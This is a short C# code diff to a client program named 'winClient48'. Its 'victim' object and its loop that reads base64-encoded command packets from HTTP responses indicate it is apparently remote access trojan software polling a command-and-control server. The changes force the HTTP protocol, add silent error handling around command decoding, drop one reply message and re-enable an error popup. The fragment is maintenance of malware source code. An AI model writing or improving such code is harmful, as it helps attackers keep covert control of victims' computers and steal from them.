@@ -535,6 +535,7 @@ namespace winClient48
                 byte[] static_recvBuf = new byte[clsVictim.MAX_BUFFER_LENGTH];
                 byte[] dynamic_recvBuf = new byte[] { };
 
+                victim.m_protocol = clsVictim.enProtocol.HTTP;
                 victim.fnHttpSend(1, 0, clsEZData.fnGenerateRandomStr());
 
                 do
@@ -552,7 +553,15 @@ namespace winClient48
                         string szHttpResp = Encoding.UTF8.GetString(dynamic_recvBuf);
                         string szBody = szHttpResp.Split(new string[] { "\r\n\r\n" }, StringSplitOptions.None).Last();
 
-                        dynamic_recvBuf = Convert.FromBase64String(szBody);
+                        try
+                        {
+                            dynamic_recvBuf = Convert.FromBase64String(szBody);
+                        }
+                        catch (Exception ex)
+                        {
+                            
+                            continue;
+                        }
 
                         dsp = new clsDSP(dynamic_recvBuf);
                         dynamic_recvBuf = dsp.MoreData;
@@ -618,7 +627,7 @@ namespace winClient48
                             }
                             else if (dsp.Param == 1)
                             {
-                                victim.fnHttpSend(2, 1, clsEZData.fnGenerateRandomStr());
+                                
                             }
                         }
                     }
@@ -627,7 +636,7 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                //MessageBox.Show(ex.Message);
+                MessageBox.Show(ex.Message);
             }
             finally
             {
